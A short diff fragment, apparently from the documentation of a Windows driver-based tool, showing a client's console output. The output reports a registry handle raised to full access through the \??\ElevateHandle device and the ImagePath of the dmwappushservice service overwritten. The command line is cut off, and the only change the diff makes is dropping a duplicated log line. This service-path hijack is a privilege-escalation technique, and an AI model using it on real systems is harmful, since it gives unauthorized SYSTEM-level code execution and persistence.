@@ -45,7 +45,6 @@ PS C:\Dev> C:\Dev\ElevateHandleClient.exe -n dmwappushservice -c "C:\Windows\Sys
 [*] Current ImagePath is "%SystemRoot%\system32\svchost.exe -k netsvcs -p".
 [>] Sending a query to \??\ElevateHandle.
 [+] Got a handle to \??\ElevateHandle (Handle = 0x28C).
-[>] Sending a query to \??\ElevateHandle.
 [+] Granted Access is elevated to KEY_ALL_ACCESS.
 [+] ImagePath value is overwritten successfully.
 [*] Done.
